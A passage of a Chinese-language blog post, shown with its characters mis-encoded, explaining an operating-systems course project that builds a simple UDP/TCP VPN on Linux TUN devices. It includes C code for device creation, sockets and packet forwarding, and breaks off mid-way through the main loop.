    <content type="html"><![CDATA[<p>æ“ä½œç³»ç»Ÿå¤§ä½œä¸š</p><span id="more"></span><h1 id="ä¸€ã€åŸºäºUDP-TCPçš„VPN"><a href="#ä¸€ã€åŸºäºUDP-TCPçš„VPN" class="headerlink" title="ä¸€ã€åŸºäºUDP/TCPçš„VPN"></a>ä¸€ã€åŸºäºUDP/TCPçš„VPN</h1><h2 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h2><ul><li>tun æ¥å£</li><li>VPNæ­å»º</li><li>éš§é“è½¬å‘æ•°æ®åŒ…</li></ul><h3 id="tun-è®¾å¤‡"><a href="#tun-è®¾å¤‡" class="headerlink" title="tun è®¾å¤‡"></a>tun è®¾å¤‡</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>tun(/tap) æ˜¯ Linux å†…æ ¸ 2.4.x ç‰ˆæœ¬ä¹‹åå®ç°çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œä¸åŒäºç‰©ç†ç½‘å¡é ç¡¬ä»¶ç½‘å¡å®ç°ï¼Œtap/tun è™šæ‹Ÿç½‘å¡å®Œå…¨ç”±è½¯ä»¶æ¥å®ç°ï¼ŒåŠŸèƒ½å’Œç¡¬ä»¶å®ç°å®Œå…¨æ²¡æœ‰å·®åˆ«ï¼Œå®ƒä»¬éƒ½å±äºç½‘ç»œè®¾å¤‡ï¼Œéƒ½å¯ä»¥é…ç½® IPï¼Œéƒ½å½’ Linux ç½‘ç»œè®¾å¤‡ç®¡ç†æ¨¡å—ç»Ÿä¸€ç®¡ç†ã€‚</p><h4 id="TUN-å·¥ä½œæœºåˆ¶"><a href="#TUN-å·¥ä½œæœºåˆ¶" class="headerlink" title="TUN å·¥ä½œæœºåˆ¶"></a><strong>TUN å·¥ä½œæœºåˆ¶</strong></h4><p>TUN è®¾å¤‡æ˜¯ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œé€šè¿‡æ­¤è®¾å¤‡ï¼Œç¨‹åºå¯ä»¥æ–¹ä¾¿å¾—æ¨¡æ‹Ÿç½‘ç»œè¡Œä¸ºã€‚å…¶å·¥ä½œæ–¹å¼å¦‚å›¾</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707171052692.png" alt="image-20210707171052692" style="zoom:80%;"><p>Linux Tun/Tapé©±åŠ¨ç¨‹åºä¸ºåº”ç”¨ç¨‹åºæä¾›äº†ä¸¤ç§äº¤äº’æ–¹å¼ï¼šè™šæ‹Ÿç½‘ç»œæ¥å£å’Œå­—ç¬¦è®¾å¤‡/dev/net/tunã€‚å†™å…¥å­—ç¬¦è®¾å¤‡/dev/net/tunçš„æ•°æ®ä¼šå‘é€åˆ°è™šæ‹Ÿç½‘ç»œæ¥å£ä¸­ï¼›å‘é€åˆ°è™šæ‹Ÿç½‘ç»œæ¥å£ä¸­çš„æ•°æ®ä¹Ÿä¼šå‡ºç°åœ¨è¯¥å­—ç¬¦è®¾å¤‡ä¸Šã€‚</p><p>åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡æ ‡å‡†çš„Socket APIå‘Tun/Tapæ¥å£å‘é€IPæ•°æ®åŒ…ï¼Œå°±å¥½åƒå¯¹ä¸€ä¸ªçœŸå®çš„ç½‘å¡è¿›è¡Œæ“ä½œä¸€æ ·ã€‚é™¤äº†åº”ç”¨ç¨‹åºä»¥å¤–ï¼Œæ“ä½œç³»ç»Ÿä¹Ÿä¼šæ ¹æ®TCP/IPåè®®æ ˆçš„å¤„ç†å‘Tun/Tapæ¥å£å‘é€IPæ•°æ®åŒ…æˆ–è€…ä»¥å¤ªç½‘æ•°æ®åŒ…ï¼Œä¾‹å¦‚ARPæˆ–è€…ICMPæ•°æ®åŒ…ã€‚Tun/Tapé©±åŠ¨ç¨‹åºä¼šå°†Tun/Tapæ¥å£æ”¶åˆ°çš„æ•°æ®åŒ…åŸæ ·å†™å…¥åˆ°/dev/net/tunå­—ç¬¦è®¾å¤‡ä¸Šï¼Œå¤„ç†Tun/Tapæ•°æ®çš„åº”ç”¨ç¨‹åºå¦‚VPNç¨‹åºå¯ä»¥ä»è¯¥è®¾å¤‡ä¸Šè¯»å–åˆ°æ•°æ®åŒ…ï¼Œä»¥è¿›è¡Œç›¸åº”å¤„ç†ã€‚</p><p>åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥é€šè¿‡/dev/net/tunå­—ç¬¦è®¾å¤‡å†™å…¥æ•°æ®åŒ…ï¼Œè¿™ç§æƒ…å†µä¸‹è¯¥å­—ç¬¦è®¾å¤‡ä¸Šå†™å…¥çš„æ•°æ®åŒ…ä¼šè¢«å‘é€åˆ°Tun/Tapè™šæ‹Ÿæ¥å£ä¸Šï¼Œè¿›å…¥æ“ä½œç³»ç»Ÿçš„TCP/IPåè®®æ ˆè¿›è¡Œç›¸åº”å¤„ç†ï¼Œå°±åƒä»ç‰©ç†ç½‘å¡è¿›å…¥æ“ä½œç³»ç»Ÿçš„æ•°æ®ä¸€æ ·ã€‚</p><h3 id="æ­å»º-VPN"><a href="#æ­å»º-VPN" class="headerlink" title="æ­å»º VPN"></a>æ­å»º VPN</h3><p><strong>å…¶å·¥ä½œæµç¨‹ä¸ºï¼š</strong></p><p>é€šè¿‡ç¨‹åºå¯ä»¥ä»<code>/dev/net/tun</code>å­—ç¬¦è®¾å¤‡ä¸­è¯»å–<code>(read)</code>æˆ–è€…å†™å…¥<code>(write)</code>æ•°æ®ï¼Œå†é€šè¿‡å°†Tunç»“åˆç‰©ç†ç½‘ç»œè®¾å¤‡ä½¿ç”¨,æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªç‚¹å¯¹ç‚¹çš„éš§é“ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦è¾¹ä¸»æœºä¸Šåº”ç”¨ç¨‹åºå‘é€åˆ°Tunè™šæ‹Ÿè®¾å¤‡ä¸Šçš„IPæ•°æ®åŒ…è¢«VPNç¨‹åºé€šè¿‡å­—ç¬¦è®¾å¤‡æ¥æ”¶ï¼Œç„¶åå†é€šè¿‡ä¸€ä¸ªUDPéš§é“å‘é€åˆ°å³ç«¯çš„VPNæœåŠ¡å™¨ä¸Šï¼ŒVPNæœåŠ¡å™¨å°†éš§é“è´Ÿè½½ä¸­çš„åŸå§‹IPæ•°æ®åŒ…å†™å…¥å­—ç¬¦è®¾å¤‡ï¼Œè¿™äº›IPåŒ…å°±ä¼šå‡ºç°åœ¨å³ä¾§çš„Tunè™šæ‹Ÿè®¾å¤‡ä¸Šï¼Œæœ€åé€šè¿‡æ“ä½œç³»ç»Ÿåè®®æ ˆå’Œsocketæ¥å£å‘é€åˆ°å³ä¾§çš„åº”ç”¨ç¨‹åºä¸Šã€‚</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707180318134.png" alt="image-20210707180318134" style="zoom:80%;"><h3 id="é€šè¿‡éš§é“å‘é€-æ¥æ”¶åŒ…"><a href="#é€šè¿‡éš§é“å‘é€-æ¥æ”¶åŒ…" class="headerlink" title="é€šè¿‡éš§é“å‘é€/æ¥æ”¶åŒ…"></a>é€šè¿‡éš§é“å‘é€/æ¥æ”¶åŒ…</h3><blockquote><p>å½“éš§é“å»ºç«‹åï¼Œå¦‚ä½•é€šè¿‡éš§é“å‘é€/æ¥æ”¶æ•°æ®åŒ…æ˜¯éœ€è¦è§£å†³çš„é—®é¢˜</p></blockquote><ul><li><p>é€šè¿‡éš§é“å‘é€</p><p>é€šè¿‡TUNæ¥å£è·å¾—ä¸€ä¸ªIPåŒ…â€”&gt;åŠ å¯†ï¼ˆæˆ–è€…éªŒè¯)â€”&gt;æŠŠå®ƒä½œä¸ºè½½è·å‘é€åˆ°éš§é“å¦ä¸€ç«¯</p></li><li><p>é€šè¿‡éš§é“æ¥æ”¶</p><p>é€šè¿‡éš§é“æ¥æ”¶è½½è·â€”&gt;è§£å¯†å¹¶éªŒè¯æ•°æ®â€”&gt;è·å¾—çœŸå®çš„åŒ…æ•°æ®â€”&gt;æŠŠåŒ…æ•°æ®å†™åˆ°TUNæ¥å£ã€‚</p></li></ul><p>å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707214533426.png" alt="image-20210707214533426"></p><p><strong>ç›‘å¬socketå’Œtun0ç½‘å¡ï¼Œç„¶åè½¬å‘æ•°æ®åŒ…</strong></p><p>æ¯ä¸€ä¸ªéš§é“åº”ç”¨éƒ½æœ‰ä¸¤ç§æ¥å£: socketæ¥å£ã€TUNæ¥å£ï¼Œä¸¤ç§æ¥å£éƒ½éœ€è¦ç›‘å¬ï¼Œéœ€è¦åœ¨ä¸¤ç§æ¥å£é—´è½¬å‘æ•°æ®ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708092049656.png" alt="image-20210708092049656"></p><h2 id="ç¨‹åºå®ç°"><a href="#ç¨‹åºå®ç°" class="headerlink" title="ç¨‹åºå®ç°"></a>ç¨‹åºå®ç°</h2><p>åœ¨ç¼–å†™ç¨‹åºä¹‹å‰éœ€è¦åšä¸€äº›å‡†å¤‡ï¼Œç¨‹åºæµç¨‹å›¾å¦‚ä¸‹</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708092000296.png" alt="image-20210708092000296" style="zoom:80%;"><p>ä»å›¾ä¸­å¯çŸ¥ç¨‹åºä¸­ä¸»è¦åŒ…å«å››ä¸ªéƒ¨åˆ†</p><ul><li>åˆ›å»ºtun0ç½‘å¡</li><li>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨socketè¿æ¥</li><li>è½¬å‘æ¥è‡ªtunnelå’Œtun0æ•°æ®</li><li>ä¸»ç¨‹åºï¼Œç›‘å¬æ¥å£é˜»å¡è¿›ç¨‹</li></ul><p><code>vpnclient</code> å’Œ <code>vpnserver</code> ç¨‹åºæ˜¯ VPN éš§é“çš„ä¸¤ç«¯ã€‚å®ƒä»¬é€šè¿‡å¥—æ¥å­—ä½¿ç”¨  UDP ç›¸äº’é€šä¿¡ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è™šçº¿æç»˜äº† VPN éš§é“çš„è·¯å¾„ã€‚ VPN å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç¨‹åºé€šè¿‡ TUN æ¥å£è¿æ¥åˆ°ä¸»æœºç³»ç»Ÿï¼Œé€šè¿‡å®ƒä»–ä»¬åšä¸¤ä»¶äº‹ï¼š</p><p>ï¼ˆ1ï¼‰ä»ä¸»æœºç³»ç»Ÿè·å– IP æ•°æ®åŒ…ï¼Œå› æ­¤æ•°æ®åŒ…å¯ä»¥é€šè¿‡éš§é“å‘é€</p><p>ï¼ˆ2ï¼‰ä»éš§é“è·å– IP æ•°æ®åŒ…ï¼Œç„¶åå°†å…¶è½¬å‘åˆ°æ‰˜ç®¡ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿä¼šå°†æ•°æ®åŒ…è½¬å‘åˆ°å…¶æœ€ç»ˆç›®çš„åœ°ã€‚</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707184214724.png" alt="image-20210707184214724" style="zoom: 80%;"><h3 id="åˆ›å»ºtunç½‘å¡"><a href="#åˆ›å»ºtunç½‘å¡" class="headerlink" title="åˆ›å»ºtunç½‘å¡"></a>åˆ›å»ºtunç½‘å¡</h3><p>åœ¨ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½éœ€è¦ä¸€ä¸ªtunç½‘å¡ï¼Œæ‰€ä»¥éœ€è¦åœ¨ä¸¤å°ä¸»æœºä¸Šéƒ½åˆ›å»ºä¸€ä¸ªtun0ç½‘å¡ï¼Œä»è€Œå½¢æˆ<code>tunnel</code>ï¼Œå®ç°é€šä¿¡</p><p>ä½¿ç”¨å‘½ä»¤åˆ›å»ºtunç½‘å¡</p><pre><code class="hljs shell">ip tuntap add dev tun0 mode tun</code></pre><p>å½“ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œå®Œå†ä½¿ç”¨<code>ifconfig -a</code>å°±å¯ä»¥çœ‹åˆ°åˆšåˆšåˆ›å»ºçš„<code>tun0</code>ç½‘å¡ï¼Œå†ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤å¯¹å…¶é…ç½®</p><pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up</code></pre><p>ä½†æ˜¯è¿™é‡Œä¸ºäº†ç¨‹åºæ‰§è¡Œæ–¹ä¾¿ï¼Œç›´æ¥åœ¨ç¨‹åºä¸­åˆ›å»ºè™šæ‹Ÿç½‘å¡</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span>&#123;   <span class="hljs-comment">// åˆ›å»º tun0 ç½‘å¡ </span>   <span class="hljs-keyword">int</span> tunfd;   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));       ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tunè®¾å¤‡ä¸åŒ…å«ä»¥å¤ªç½‘å¤´éƒ¨</span>   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// æ‰“å¼€æ–‡ä»¶</span>   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// æ‰“å¼€è®¾å¤‡</span>   <span class="hljs-keyword">return</span> tunfd;    <span class="hljs-comment">// è¯¥å‡½æ•°æ‰§è¡Œå®Œå æ‰§è¡Œå‘½ä»¤ifconfig tunX 192.168.53.5/24 up ä¸ºtunç½‘å¡è®¾ç½®IPå¹¶å¼€å¯</span>&#125;</code></pre><h3 id="socketè¿æ¥"><a href="#socketè¿æ¥" class="headerlink" title="socketè¿æ¥"></a>socketè¿æ¥</h3><p><code>VPN server</code></p><h4 id="UDPè¿æ¥"><a href="#UDPè¿æ¥" class="headerlink" title="UDPè¿æ¥"></a>UDPè¿æ¥</h4><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">initUDPServer</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">int</span> sockfd;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>;</span>    <span class="hljs-keyword">char</span> buff[<span class="hljs-number">100</span>];    <span class="hljs-built_in">memset</span>(&amp;server, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server));    server.sin_family = AF_INET;       <span class="hljs-comment">// æœåŠ¡å™¨åœ°å€ç±»å‹ä¸ºIPV4            </span>    server.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="hljs-comment">//æœåŠ¡å™¨IP</span>    server.sin_port = htons(PORT_NUMBER);        <span class="hljs-comment">// ç«¯å£å·</span>    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);  <span class="hljs-comment">//åˆ›å»ºUDPçš„å¥—æ¥å­—</span>    bind(sockfd, (struct sockaddr*) &amp;server, <span class="hljs-keyword">sizeof</span>(server));  <span class="hljs-comment">// socketç»‘å®šåœ°å€å’Œç«¯å£</span>    <span class="hljs-comment">// ç­‰å¾…è¿æ¥</span>    bzero(buff, <span class="hljs-number">100</span>);   <span class="hljs-comment">//æ¸…ç©ºç¼“å†²åŒº</span>    <span class="hljs-keyword">int</span> peerAddrLen = <span class="hljs-keyword">sizeof</span>(struct sockaddr_in); <span class="hljs-comment">//åˆå§‹åŒ–ç»“æ„ä½“</span>    <span class="hljs-keyword">int</span> len = recvfrom(sockfd, buff, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen);      <span class="hljs-comment">// ç­‰å¾…æ¥æ”¶æ•°æ® </span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected with the client: %s\n&quot;</span>, buff);    <span class="hljs-keyword">return</span> sockfd;&#125;</code></pre><p><code>VPN client</code></p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">connectToUDPServer</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-comment">//åˆ›å»ºsocketè¿æ¥ è¿æ¥åˆ°vpnæœåŠ¡å™¨</span>    <span class="hljs-keyword">int</span> sockfd;    <span class="hljs-keyword">char</span> *hello=<span class="hljs-string">&quot;Hello&quot;</span>;<span class="hljs-comment">//æŒ‡å®šæœåŠ¡å™¨çš„åœ°å€ç»“æ„</span>    <span class="hljs-built_in">memset</span>(&amp;peerAddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(peerAddr));    peerAddr.sin_family = AF_INET;      <span class="hljs-comment">// æœåŠ¡å™¨åœ°å€ç±»å‹ä¸ºIPV4   </span>    peerAddr.sin_port = htons(PORT_NUMBER);    peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);      sendto(sockfd, hello, <span class="hljs-built_in">strlen</span>(hello), <span class="hljs-number">0</span>,    <span class="hljs-comment">// è¿æ¥æœåŠ¡å™¨åå‘é€ä¸€ä¸ªæ¶ˆæ¯ hello</span>                (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));    <span class="hljs-keyword">return</span> sockfd;&#125;</code></pre><h4 id="TCPè¿æ¥"><a href="#TCPè¿æ¥" class="headerlink" title="TCPè¿æ¥"></a>TCPè¿æ¥</h4><p><code>VPN server</code></p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">initTCPServer</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa_server</span>;</span>    <span class="hljs-keyword">int</span> listen_sock;    listen_sock= socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);    CHK_ERR(listen_sock, <span class="hljs-string">&quot;socket&quot;</span>);    <span class="hljs-built_in">memset</span> (&amp;sa_server, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(sa_server));    sa_server.sin_family      = AF_INET;    sa_server.sin_addr.s_addr = INADDR_ANY;    sa_server.sin_port        = htons (<span class="hljs-number">4433</span>);    <span class="hljs-keyword">int</span> err = bind(listen_sock, (struct sockaddr*)&amp;sa_server, <span class="hljs-keyword">sizeof</span>(sa_server));    CHK_ERR(err, <span class="hljs-string">&quot;bind&quot;</span>);    err = listen(listen_sock, <span class="hljs-number">5</span>);    CHK_ERR(err, <span class="hljs-string">&quot;listen&quot;</span>);    <span class="hljs-keyword">return</span> listen_sock;&#125;</code></pre><p><code>VPN client</code></p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">initTCPClient</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* hostname, <span class="hljs-keyword">int</span> port)</span></span><span class="hljs-function"></span>&#123;   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>;</span>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostent</span>* <span class="hljs-title">hp</span> =</span> gethostbyname(hostname);<span class="hljs-comment">// åˆ›å»ºTCP socket</span>   <span class="hljs-keyword">int</span> sockfd= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);   <span class="hljs-comment">// å¡«å†™ip ç«¯å£ å’Œåè®®ä¿¡æ¯</span>   <span class="hljs-built_in">memset</span> (&amp;server_addr, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(server_addr));   <span class="hljs-built_in">memcpy</span>(&amp;(server_addr.sin_addr.s_addr), hp-&gt;h_addr, hp-&gt;h_length);   server_addr.sin_port   = htons (port);   server_addr.sin_family = AF_INET;   <span class="hljs-comment">// è¿æ¥ç›®çš„åœ°å€</span>   connect(sockfd, (struct sockaddr*) &amp;server_addr,           <span class="hljs-keyword">sizeof</span>(server_addr));   <span class="hljs-keyword">return</span> sockfd;&#125;</code></pre><h3 id="è½¬å‘ç«¯å£æ•°æ®"><a href="#è½¬å‘ç«¯å£æ•°æ®" class="headerlink" title="è½¬å‘ç«¯å£æ•°æ®"></a>è½¬å‘ç«¯å£æ•°æ®</h3><p>å®¢æˆ·ç«¯ç¨‹åºå’ŒæœåŠ¡å™¨ç«¯ç¨‹åºéƒ½éœ€è¦ä»¥ä¸‹ä¸¤ä¸ªåº“å‡½æ•°</p><blockquote><p>int sendto(int s, const void * msg, int len, unsigned int flags, const struct sockaddr * to, int tolen);</p><p>å‡½æ•°è¯´æ˜ï¼šsendto() ç”¨æ¥å°†æ•°æ®ç”±æŒ‡å®šçš„socket ä¼ ç»™å¯¹æ–¹ä¸»æœº. å‚æ•°s ä¸ºå·²å»ºå¥½è¿çº¿çš„socket, å¦‚æœåˆ©ç”¨UDPåè®®åˆ™ä¸éœ€ç»è¿‡è¿çº¿æ“ä½œ. å‚æ•°msg æŒ‡å‘æ¬²è¿çº¿çš„æ•°æ®å†…å®¹, å‚æ•°flags ä¸€èˆ¬è®¾0,  å‚æ•°to ç”¨æ¥æŒ‡å®šæ¬²ä¼ é€çš„ç½‘ç»œåœ°å€, ç»“æ„sockaddr è¯·å‚è€ƒbind(). å‚æ•°tolen ä¸ºsockaddr çš„ç»“æœé•¿åº¦.</p><p>int recvfrom(int s, void *buf, int len, unsigned int flags, struct sockaddr *from,int *fromlen);</p><p>å‡½æ•°è¯´æ˜ï¼šrecv()ç”¨æ¥æ¥æ”¶è¿œç¨‹ä¸»æœºç»æŒ‡å®šçš„socket ä¼ æ¥çš„æ•°æ®, å¹¶æŠŠæ•°æ®å­˜åˆ°ç”±å‚æ•°buf æŒ‡å‘çš„å†…å­˜ç©ºé—´, å‚æ•°len ä¸ºå¯æ¥æ”¶æ•°æ®çš„æœ€å¤§é•¿åº¦. å‚æ•°flags ä¸€èˆ¬è®¾0,  å‚æ•°from ç”¨æ¥æŒ‡å®šæ¬²ä¼ é€çš„ç½‘ç»œåœ°å€, ç»“æ„sockaddr è¯·å‚è€ƒbind(). å‚æ•°fromlen ä¸ºsockaddr çš„ç»“æ„é•¿åº¦.</p></blockquote><p>ä»tun0æ¥æ”¶æ•°æ®è½¬å‘åˆ°tunnel</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;    <span class="hljs-keyword">int</span>  len;    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//å®šä¹‰æ¥æ”¶æ•°çš„ç¼“å†²åŒº</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// æ¸…ç©ºç¼“å†²åŒº</span>    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// è¯»å–æ¥è‡ªtun0ç½‘å¡çš„æ•°æ®ï¼Œä¿å­˜åœ¨ç¼“å†²åŒºä¸­</span>    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));    <span class="hljs-comment">// é€šè¿‡socketå‘é€æ•°æ®</span>&#125;</code></pre><p>ä»tunnelæ¥æ”¶æ•°æ®è½¬å‘åˆ°tun0</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;    <span class="hljs-keyword">int</span>  len;    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);    bzero(buff, BUFF_SIZE);    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// æ¥æ”¶æ•°æ®è‡³buffï¼Œä¿å­˜æ•°æ®çš„é•¿åº¦</span>    write(tunfd, buff, len);<span class="hljs-comment">// é€šè¿‡writeå‘é€åˆ°tun0</span>&#125;</code></pre><h3 id="ä¸»å‡½æ•°"><a href="#ä¸»å‡½æ•°" class="headerlink" title="ä¸»å‡½æ•°"></a>ä¸»å‡½æ•°</h3><p>ä¸»è¦ä½œç”¨ï¼Œè°ƒç”¨ä¹‹å‰çš„å‡½æ•°ï¼Œåˆ›å»ºtun0ç½‘å¡ï¼›å»ºç«‹åŸºäºudpçš„socketè¿æ¥ï¼›å¾ªç¯æ¥æ”¶æ•°æ®</p><p>ç”¨åˆ°çš„åº“å‡½æ•°</p><blockquote><p>int select(int n, fd_set * readfds, fd_set * writefds, fd_set * exceptfds, struct timeval * timeout);</p><p>å‡½æ•°è¯´æ˜ï¼šselect()ç”¨æ¥ç­‰å¾…æ–‡ä»¶æè¿°è¯çŠ¶æ€çš„æ”¹å˜ï¼Œä¼šé˜»å¡è¿›ç¨‹. å‚æ•°n ä»£è¡¨æœ€å¤§çš„æ–‡ä»¶æè¿°è¯åŠ 1, å‚æ•°readfdsã€writefds å’Œexceptfds ç§°ä¸ºæè¿°è¯ç»„, æ˜¯ç”¨æ¥å›ä¼ è¯¥æè¿°è¯çš„è¯», å†™æˆ–ä¾‹å¤–çš„çŠ¶å†µ. åº•ä¸‹çš„å®æä¾›äº†å¤„ç†è¿™ä¸‰ç§æè¿°è¯ç»„çš„æ–¹å¼ï¼š</p><p>  FD_CLR(inr fd, fd_set*  set); ç”¨æ¥æ¸…é™¤æè¿°è¯ç»„set ä¸­ç›¸å…³fd çš„ä½<br>  FD_ISSET(int fd, fd_set * set); ç”¨æ¥æµ‹è¯•æè¿°è¯ç»„set ä¸­ç›¸å…³fd çš„ä½æ˜¯å¦ä¸ºçœŸ<br>  FD_SET(int fd, fd_set* set); ç”¨æ¥è®¾ç½®æè¿°è¯ç»„set ä¸­ç›¸å…³fd çš„ä½<br>  FD_ZERO(fd_set * set); ç”¨æ¥æ¸…é™¤æè¿°è¯ç»„set çš„å…¨éƒ¨ä½ </p><p>FD_ISSET</p><p>æ£€æµ‹fdåœ¨fdseté›†åˆä¸­çš„çŠ¶æ€æ˜¯å¦å˜åŒ–ï¼Œå½“æ£€æµ‹åˆ°fdçŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶è¿”å›çœŸï¼Œå¦åˆ™ï¼Œè¿”å›å‡ï¼ˆä¹Ÿå¯ä»¥è®¤ä¸ºé›†åˆä¸­æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦å¯ä»¥è¯»å†™ï¼‰ã€‚</p><p>fd_set</p><p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªé›†åˆï¼Œè¿™ä¸ªé›†åˆä¸­å­˜æ”¾çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦(file descriptor)ï¼Œå³æ–‡ä»¶å¥æŸ„ï¼Œå®ƒç”¨ä¸€ä½æ¥è¡¨ç¤ºä¸€ä¸ªfdï¼ˆä¸‹é¢ä¼šä»”ç»†ä»‹ç»ï¼‰</p></blockquote><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span> </span>&#123;   <span class="hljs-keyword">int</span> tunfd, sockfd;   tunfd  = createTunDevice(); <span class="hljs-comment">// åˆ›å»ºtun0ç½‘å¡ </span>   sockfd = connectToUDPServer(); <span class="hljs-comment">// å»ºç«‹socketè¿æ¥</span>       <span class="hljs-comment">// è¿›å…¥ä¸»å¾ªç¯</span>   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;     fd_set readFDSet;     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// å°†setæ¸…é›¶ä½¿é›†åˆä¸­ä¸å«ä»»ä½•fd</span>     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// å°†socketfdåŠ å…¥seté›†åˆ</span>     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// å°†tunfdåŠ å…¥seté›†åˆ</span>     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// ç›‘å¬ä¸¤ä¸ªç«¯å£ é˜»å¡è¿›ç¨‹ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªç«¯å£æ”¶åˆ°æ•°æ®</span>    <span class="hljs-comment">// å½“æ”¶åˆ°æ•°æ®ç¨‹åºç»§ç»­æ‰§è¡Œ å¯¹æ•°æ®è¿›è¡Œè½¬å‘</span>     